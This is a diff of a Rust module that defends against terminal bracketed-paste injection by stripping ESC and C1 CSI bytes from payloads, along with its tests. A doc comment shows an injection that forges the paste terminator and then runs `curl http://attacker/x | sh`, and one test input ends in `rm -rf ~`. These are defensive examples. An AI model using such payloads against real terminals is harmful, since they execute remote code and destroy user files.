@@ -9,11 +9,18 @@
 //! markers as text, carriage returns included. A payload that carries its own
 //! `ESC[201~` ends the paste there, and every byte after it arrives as typed
 //! keys: `harmless\x1b[201~\rcurl http://attacker/x | sh\r` runs the command.
-//! Every ESC (and the one-byte C1 CSI, U+009B) is removed from the payload
-//! before it is wrapped, so no escape sequence in it can act, and the
+//! Every ESC (and the C1 CSI, U+009B, UTF-8 `C2 9B`) is removed from the
+//! payload before it is wrapped, so no escape sequence in it can act, and the
 //! terminator's remaining characters (`[201~`) land as the literal text they
 //! are. Line breaks and tabs are kept: a multi-line paste into a prompt stays
-//! multi-line.
+//! multi-line. The payload is handled as bytes, so a paste that is not UTF-8
+//! reaches the pane byte for byte apart from what is removed.
+//!
+//! Strip, not split: the fix could instead end the paste at the payload's
+//! terminator and send the rest as a second paste. That relies on the pane
+//! reading the rest as a paste too, and a pane that never turned bracketed
+//! paste on reads it as keys, where a surviving ESC acts as one. Removing the
+//! ESC leaves nothing in the payload that any pane can act on.
 
 use std::borrow::Cow;
 
@@ -22,26 +29,44 @@ pub const PASTE_START: &[u8] = b"\x1b[200~";
 /// What it reads as the end of one.
 pub const PASTE_END: &[u8] = b"\x1b[201~";
 
-/// `text` with every character that could open an escape sequence removed:
-/// ESC, and the C1 control sequence introducer that some parsers treat as
-/// `ESC [`. Borrowed when there was nothing to remove.
+/// ESC, which opens every 7-bit escape sequence.
+const ESC: u8 = 0x1b;
+/// The C1 control sequence introducer, U+009B, as UTF-8. Among the C1
+/// introducers only CSI is stripped: CSI is the one that can forge the
+/// terminator (`CSI 201 ~`), where DCS, OSC and the rest cannot end a paste.
+const C1_CSI: &[u8] = &[0xc2, 0x9b];
+
+/// `payload` with every byte sequence that could open an escape sequence
+/// removed: each ESC, and each UTF-8 C1 CSI. Every other byte is kept exactly,
+/// valid UTF-8 or not. Borrowed when there was nothing to remove.
 #[must_use]
-pub fn sanitize(text: &str) -> Cow<'_, str> {
-    if text.chars().any(opens_a_sequence) {
-        Cow::Owned(text.chars().filter(|c| !opens_a_sequence(*c)).collect())
-    } else {
-        Cow::Borrowed(text)
+pub fn sanitize(payload: &[u8]) -> Cow<'_, [u8]> {
+    if !opens_a_sequence(payload) {
+        return Cow::Borrowed(payload);
     }
+    let mut kept = Vec::with_capacity(payload.len());
+    let mut at = 0;
+    while at < payload.len() {
+        if payload[at] == ESC {
+            at += 1;
+        } else if payload[at..].starts_with(C1_CSI) {
+            at += C1_CSI.len();
+        } else {
+            kept.push(payload[at]);
+            at += 1;
+        }
+    }
+    Cow::Owned(kept)
 }
 
-/// `text` as one bracketed paste: the markers around the sanitized payload, so
-/// the pane sees exactly one paste and nothing after it.
+/// `payload` as one bracketed paste: the markers around the sanitized payload,
+/// so the pane sees exactly one paste and nothing after it.
 #[must_use]
-pub fn bracketed(text: &str) -> Vec<u8> {
-    let text = sanitize(text);
-    let mut bytes = Vec::with_capacity(text.len() + PASTE_START.len() + PASTE_END.len());
+pub fn bracketed(payload: &[u8]) -> Vec<u8> {
+    let payload = sanitize(payload);
+    let mut bytes = Vec::with_capacity(payload.len() + PASTE_START.len() + PASTE_END.len());
     bytes.extend_from_slice(PASTE_START);
-    bytes.extend_from_slice(text.as_bytes());
+    bytes.extend_from_slice(&payload);
     bytes.extend_from_slice(PASTE_END);
     bytes
 }
@@ -60,15 +85,14 @@ pub fn rebracket(input: &[u8]) -> Cow<'_, [u8]> {
     else {
         return Cow::Borrowed(input);
     };
-    let payload = String::from_utf8_lossy(inner);
-    if !payload.chars().any(opens_a_sequence) {
+    if !opens_a_sequence(inner) {
         return Cow::Borrowed(input);
     }
-    Cow::Owned(bracketed(&payload))
+    Cow::Owned(bracketed(inner))
 }
 
-const fn opens_a_sequence(c: char) -> bool {
-    matches!(c, '\u{1b}' | '\u{9b}')
+fn opens_a_sequence(payload: &[u8]) -> bool {
+    payload.contains(&ESC) || payload.windows(C1_CSI.len()).any(|pair| pair == C1_CSI)
 }
 
 #[cfg(test)]
@@ -93,7 +117,7 @@ mod tests {
 
     #[test]
     fn a_payload_carrying_the_terminator_lands_as_literal_text() {
-        let bytes = bracketed(HOSTILE);
+        let bytes = bracketed(HOSTILE.as_bytes());
         assert_eq!(markers(&bytes), vec!["start", "end"], "exactly one paste");
         assert!(bytes.starts_with(PASTE_START) && bytes.ends_with(PASTE_END));
         let inside = &bytes[PASTE_START.len()..bytes.len() - PASTE_END.len()];
@@ -106,32 +130,50 @@ mod tests {
 
     #[test]
     fn a_c1_introducer_cannot_end_the_paste_either() {
-        let bytes = bracketed("a\u{9b}201~\rrm -rf ~\r");
+        let bytes = bracketed("a\u{9b}201~\rrm -rf ~\r".as_bytes());
         assert_eq!(markers(&bytes), vec!["start", "end"]);
         assert!(!String::from_utf8_lossy(&bytes).contains('\u{9b}'));
     }
 
     #[test]
     fn ordinary_text_is_unchanged_line_breaks_and_tabs_included() {
-        let text = "fn main() {\n\tprintln!(\"hi\");\r\n}\n";
+        let text = "fn main() {\n\tprintln!(\"hi\");\r\n}\n".as_bytes();
         assert!(matches!(sanitize(text), Cow::Borrowed(_)));
-        assert_eq!(
-            bracketed(text),
-            [PASTE_START, text.as_bytes(), PASTE_END].concat()
-        );
+        assert_eq!(bracketed(text), [PASTE_START, text, PASTE_END].concat());
     }
 
     #[test]
     fn an_emulator_paste_is_rebuilt_only_when_its_payload_needs_it() {
         let hostile = [PASTE_START, HOSTILE.as_bytes(), PASTE_END].concat();
         let rebuilt = rebracket(&hostile);
-        assert_eq!(rebuilt.as_ref(), bracketed(HOSTILE).as_slice());
+        assert_eq!(rebuilt.as_ref(), bracketed(HOSTILE.as_bytes()).as_slice());
         assert_eq!(markers(&rebuilt), vec!["start", "end"]);
 
         let clean = [PASTE_START, b"ls -la\r".as_slice(), PASTE_END].concat();
         assert!(matches!(rebracket(&clean), Cow::Borrowed(_)));
     }
 
+    #[test]
+    fn a_paste_that_is_not_utf8_stays_byte_exact() {
+        let binary = [
+            0xff, 0xfe, b'a', ESC, b'[', b'2', b'0', b'1', b'~', 0x80, b'\r',
+        ];
+        assert_eq!(
+            sanitize(&binary).as_ref(),
+            &[0xff, 0xfe, b'a', b'[', b'2', b'0', b'1', b'~', 0x80, b'\r'],
+            "only the ESC goes; invalid UTF-8 is not replaced"
+        );
+        let lone = [b'x', 0x9b, b'y'];
+        assert!(
+            matches!(sanitize(&lone), Cow::Borrowed(_)),
+            "a bare 0x9b is not UTF-8 CSI and is kept as it came"
+        );
+    }
+
+    /// The unterminated case is never rebuilt, and today it cannot occur:
+    /// xterm.js emits one `onData` per paste, markers included, so a paste
+    /// always reaches `rebracket` whole. A transport that chunks input (the
+    /// remote leg) must re-bracket per chunk, or a split paste passes through.
     #[test]
     fn typed_input_is_never_touched() {
         for input in [
